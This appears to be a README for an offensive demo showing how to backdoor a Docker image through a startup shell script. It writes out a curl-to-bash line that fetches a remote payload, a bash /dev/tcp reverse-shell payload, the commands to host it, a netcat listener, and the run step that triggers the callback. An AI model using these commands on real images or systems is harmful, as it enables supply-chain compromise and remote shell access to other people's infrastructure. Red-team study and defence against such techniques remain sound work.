# Backdoored shell script in container image

## Scenario

You have the acccess to modify docker images either through source that contains a shell script called in the Dockerfile or through an image registry. The shell script that you can modify runs on startup (a pretty common scenario)

## Building the image

First you need to build the image. This is emulating the process that will take place whenever the target image is built. Based on our scenario the victim will either be pulling in the modified source shell script or you replaced the image in the registry after updating the shell script.

The line that ends up backdooring the image will be the following:

```curl -s http://<ip_address>:8000/payload.txt | bash```

### Build the image

* Update line 4 with the ip address of your payload server

```docker build -t backdoor .```

## Setting up the payload server

Next you need to setup the server that will host the file containing your payload. The payload can be anything you want to execute when the container is started. In this example we will use a reverse shell that calls back to a netcat server. I'm using python SimpleHTTPServer to host the file but this can be setup other ways as long as the file can be accessed.

### Create the payload file

```touch payload.txt```


### Add your payload (in this example the reverse shell)

```nohup bash -c bash -i >& /dev/tcp/<ip_address>/8080 0>&1```

* This payload example can be found in payload.txt
* Update the ip address and port with the values for your netcat server

### Starts a server on port 8000 by default

```python -m SimpleHTTPServer```

## Start your Netcat handler

This step is only required if you choose to make your payload a reverse shell. This step will start a netcat server that will handle the callback from your reverse shell.

### Start the netcat listener

```netcat -lkvp 8080```

## Start your container

This step emulates what will occur when the backdoored image it deployed and the container starts. The script in the case will only execute once when the container is started

### Start the Docker container (execute the payload)

```docker run -it backdoor```

If everything goes according to plan you should get a callback similar to the this [tweet](https://twitter.com/sneakerhax/status/1416870516976099330?s=20)
